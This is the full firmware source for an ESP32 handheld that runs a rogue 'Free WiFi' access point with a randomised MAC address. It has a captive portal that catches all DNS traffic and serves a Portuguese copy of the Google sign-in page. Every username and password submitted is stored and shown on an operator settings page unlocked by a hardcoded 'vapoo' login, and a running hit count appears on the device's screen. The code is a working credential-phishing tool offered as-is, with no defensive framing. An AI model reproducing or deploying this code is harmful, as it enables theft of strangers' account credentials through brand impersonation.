#include <vector>

#include <Arduino.h>
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <esp_system.h> 
#include "OneButton.h"
#include <Preferences.h>
#include <TFT_eSPI.h>
#include <WiFi.h>
#include "imagem0.h" 
#include "imagem1.h"  
#include "imagem2.h"  
#include "imagem3.h"  


// T-QT Pins
#define PIN_BAT_VOLT  4
#define PIN_LCD_BL   10
#define PIN_BTN_L     0
#define PIN_BTN_R    47

AsyncWebServer server(80);
DNSServer dnsServer;
IPAddress apIP;
OneButton btn_left(PIN_BTN_L, true);
OneButton btn_right(PIN_BTN_R, true);
Preferences preferences;
std::vector<String> loginAttempts;
String ssid;
TFT_eSPI tft = TFT_eSPI(128, 128);

bool displayOn = true;
int hits = 0;

const unsigned short* imagens[] = { imagem_0, imagem_1, imagem_2, imagem_3 };
const int totalImagens = 4;
int currentImageIndex = 0;
unsigned long lastImageUpdate = 0;

void buttonLeftPressed() {
    if (displayOn) {
        digitalWrite(PIN_LCD_BL, LOW);
        displayOn = false;
    } else {
        digitalWrite(PIN_LCD_BL, HIGH);
        displayOn = true;
    }
}

String formatNumber(int num) {
    String str = String(num);
    int len = str.length();
    String formatted = "";

    for (int i = 0; i < len; i++) {
        if (i > 0 && (len - i) % 3 == 0)
            formatted += ",";
        formatted += str[i];
    }

    return formatted;
}

IPAddress getRandomIPAddress() {
    while (true) {
        byte octet1 = random(1, 224);
        byte octet2 = random(0, 256);
        byte octet3 = random(0, 256);
        byte octet4 = random(1, 255);

        if (octet1 == 10) continue;
        if (octet1 == 172 && octet2 >= 16 && octet2 <= 31) continue;
        if (octet1 == 192 && octet2 == 168) continue;
        if (octet1 == 127) continue;
        if (octet1 == 169 && octet2 == 254) continue;
        if (octet1 == 192 && octet2 == 0 && octet3 == 2) continue;
        if (octet1 == 198 && (octet2 == 51 || octet2 == 18)) continue;
        if (octet1 >= 224) continue;

        return IPAddress(octet1, octet2, octet3, octet4);
    }
}

void handleClearAttempts(AsyncWebServerRequest *request) {
    loginAttempts.clear();
    hits = 0;
    updateDisplay();
    request->redirect("/settings");
}

void handleLogin(AsyncWebServerRequest *request) {
    String username = request->arg("username");
    String password = request->arg("password");
    
    hits++; // Incrementa o contador de POSTs
    loginAttempts.push_back(username + ":" + password);
    updateDisplay();
    
    if (username == "vapoo" && password == "vapoo")
        request->redirect("/settings");
    else
        request->send(200, "text/html", "<html><body><h1>Obrigado por usar nossa rede, redirecionando...</h1><script>alert('obrigado por usar nossa rede!')</script></body></html>");
}

void handleRoot(AsyncWebServerRequest *request) {
    String html = R"=====(
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fazer login - Conta do Google</title>
    <style>
        /* Reset e estilos base */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
        }
        
        body {
            background-color: #fff;
            color: #202124;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
            padding: 20px;
        }
        
        /* Container principal */
        .container {
            width: 100%;
            max-width: 448px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            margin: 20px;
            box-sizing: border-box;
        }
        
        /* Logo Google - CSS puro */
        .google-logo {
            width: 75px;
            height: 75px;
            margin: 0 auto 16px;
            position: relative;
        }
        
        .google-logo .blue {
            width: 37px;
            height: 37px;
            background: #4285F4;
            position: absolute;
            top: 0;
            left: 0;
            border-radius: 50% 0 0 50%;
        }
        
        .google-logo .red {
            width: 37px;
            height: 37px;
            background: #EA4335;
            position: absolute;
            top: 0;
            right: 0;
            border-radius: 0 50% 50% 0;
        }
        
        .google-logo .yellow {
            width: 37px;
            height: 37px;
            background: #FBBC05;
            position: absolute;
            bottom: 0;
            left: 0;
            border-radius: 50% 0 0 50%;
        }
        
        .google-logo .green {
            width: 37px;
            height: 37px;
            background: #34A853;
            position: absolute;
            bottom: 0;
            right: 0;
            border-radius: 0 50% 50% 0;
        }
        
        /* Títulos */
        .title {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            margin: 16px 0;
            color: #202124;
        }
        
        .subtitle {
            font-size: 16px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 24px;
            color: #5f6368;
        }
        
        /* Formulário */
        form {
            width: 100%;
        }
        
        .form-group {
            margin-bottom: 24px;
            position: relative;
        }
        
        input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            transition: border 0.2s;
            outline: none;
        }
        
        input:focus {
            border: 1px solid #1a73e8;
            box-shadow: 0 0 0 2px #e8f0fe;
        }
        
        /* Links */
        .forgot-email {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            display: block;
            margin-bottom: 26px;
        }
        
        .forgot-email:hover {
            text-decoration: underline;
        }
        
        /* Botões */
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 26px;
        }
        
        .create-account {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
            padding: 8px 0;
        }
        
        .create-account:hover {
            text-decoration: underline;
        }
        
        .next-button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            transition: background-color 0.2s, box-shadow 0.2s;
        }
        
        .next-button:hover {
            background: #1b66c9;
            box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3), 0 1px 3px 1px rgba(66,133,244,0.15);
        }
        
        .footer {
            margin-top: 24px;
            display: flex;
            justify-content: space-between;
            width: 100%;
            max-width: 448px;
            font-size: 12px;
            color: #5f6368;
        }
        
        .language-selector {
            border: none;
            background: none;
            color: #1a73e8;
            cursor: pointer;
            font-size: 12px;
            padding: 8px 0;
        }
        
        /* mobile */
        @media (max-width: 480px) {
            .container {
                border: none;
                padding: 24px;
                margin: 0;
            }
            
            body {
                padding: 0;
            }
            
            .footer {
                flex-direction: column;
                align-items: center;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="google-logo">
            <div class="blue"></div>
            <div class="red"></div>
            <div class="yellow"></div>
            <div class="green"></div>
        </div>
        
        <h1 class="title">Fazer login</h1>
        <p class="subtitle">Use sua Conta do Google</p>
        
        <form action='/' method='post'>
            <div class="form-group">
                <input type='text' name='username' placeholder='E-mail ou telefone' autofocus>

                <input type='text' name='password' placeholder='Senha' autofocus>
            </div>
            
            <a href="#" class="forgot-email">Esqueceu seu e-mail?</a>
            
            <div class="buttons">
                <a href="#" class="create-account">Criar conta</a>
                <button type="submit" class="next-button">Avançar</button>
            </div>
        </form>
    </div>
    
    <div class="footer">
        <div>Português (Brasil)</div>
        <div>
            <button class="language-selector">▼</button>
        </div>
    </div>
</body>
</html>
)=====";

    request->send(200, "text/html", html);
}

void handleSettings(AsyncWebServerRequest *request) {
    String html = R"=====(
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #fafafa;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 20px;
        }
        h1 {
            color: #262626;
            font-size: 24px;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #262626;
        }
        input[type="text"] {
            width: 100%;
            padding: 8px 10px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            font-size: 14px;
        }
        button {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .attempts {
            margin-top: 30px;
            border-top: 1px solid #dbdbdb;
            padding-top: 20px;
        }
        .attempt-item {
            padding: 8px 0;
            border-bottom: 1px solid #efefef;
        }
        .logo-container {
            text-align: center;
            margin-bottom: 20px;
        }
    
    </style>
</head>
<body>
    <div class="container">
        <h1>Settings</h1>
        
        <form action='/settings' method='post'>
            <div class="form-group">
                <label for="new_ssid">New SSID:</label>
                <input type="text" id="new_ssid" name="new_ssid" minlength="1" maxlength="32">
            </div>
            <button type="submit">Update SSID</button>
        </form>
        
        <form action='/clear' method='post' style="margin-top: 30px;">
            <button type="submit" style="background-color: #ed4956;">CLEAR Login Attempts</button>
        </form>
        
        <div class="attempts">
            <h2>Login Attempts: )=====" + String(hits) + R"=====(</h2>
)=====";
    
    for (const auto& attempt : loginAttempts)
        html += "            <div class=\"attempt-item\">" + attempt + "</div>\n";
    
    html += R"=====(
        </div>
    </div>
</body>
</html>
)=====";
    
    request->send(200, "text/html", html);
}

void handleUpdateSSID(AsyncWebServerRequest *request) {
    String newSSID = request->arg("new_ssid");

    if (newSSID.length() > 0 && newSSID.length() <= 32) {
        ssid = newSSID;
        preferences.putString("ssid", ssid);
        setupWiFiAP();
        updateDisplay();
        request->redirect("/settings");
    } else {
        String html = R"=====(
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 20px; background-color: #fafafa; }
        .container { max-width: 600px; margin: 0 auto; background: #fff; border: 1px solid #dbdbdb; border-radius: 8px; padding: 20px; }
        h1 { color: #ed4956; font-size: 24px; }
        p { color: #262626; }
        a { color: #0095f6; text-decoration: none; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Error</h1>
        <p>SSID must be between 1 and 32 characters.</p>
        <a href='/settings'>Back to Settings</a>
    </div>
</body>
</html>
)=====";

        request->send(400, "text/html", html);
    }
}

void loadPreferences() {
    preferences.begin("config", false);
    ssid = preferences.getString("ssid", "Free WiFi");
}

void updateDisplay() {
    tft.pushImage(0, 0, 128, 128, imagens[currentImageIndex]);
    tft.fillRect(0, tft.height() - 12, tft.width(), 12, TFT_BLACK);
    String displayText = ssid + " [" + String(hits) + "]";
    
    tft.setTextSize(1);
    tft.setTextColor(TFT_YELLOW);
    
    int textWidth = tft.textWidth(displayText);
    int xPos = (tft.width() - textWidth) / 2;
    
    tft.setCursor(xPos, tft.height() - 10);
    tft.print(displayText);
}

void updateImage() {
    unsigned long currentTime = millis();
    if (currentTime - lastImageUpdate >= 100) {
        lastImageUpdate = currentTime;
        currentImageIndex = (currentImageIndex + 1) % totalImagens;
        updateDisplay();
    }
}

void loop() {
    dnsServer.processNextRequest();
    updateImage();
    btn_left.tick();
    btn_right.tick();
    delay(10);
}

void setRandomMAC() {
    uint8_t mac[6];
    mac[0] = 0x02;
    mac[1] = random(0, 256);
    mac[2] = random(0, 256);
    mac[3] = random(0, 256);
    mac[4] = random(0, 256);
    mac[5] = random(0, 256);
    esp_base_mac_addr_set(mac);
}

void setup() {
    Serial.begin(115200);
    uint32_t seed = esp_random();
    randomSeed(seed);

    loadPreferences();
    setupWiFiAP();
    setupServer();

    tft.init();
    tft.setRotation(0);
    tft.setSwapBytes(true);
    tft.fillRect(0, tft.height() - 12, tft.width(), 12, TFT_BLACK);

    updateDisplay();
    btn_left.attachClick(buttonLeftPressed);
}

void setupServer() {
    dnsServer.start(53, "*", apIP);
    server.on("/", HTTP_GET, handleRoot);
    server.on("/", HTTP_POST, handleLogin);
    server.on("/settings", HTTP_GET, handleSettings);
    server.on("/settings", HTTP_POST, handleUpdateSSID);
    server.on("/clear", HTTP_POST, handleClearAttempts);
    server.onNotFound([](AsyncWebServerRequest *request) {
        request->redirect("http://" + apIP.toString());
    });
    server.begin();
}

void setupWiFiAP() {
    if (WiFi.softAPgetStationNum() > 0) {
        WiFi.softAPdisconnect(true);
    }

    setRandomMAC();
    apIP = getRandomIPAddress();
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(ssid.c_str());
}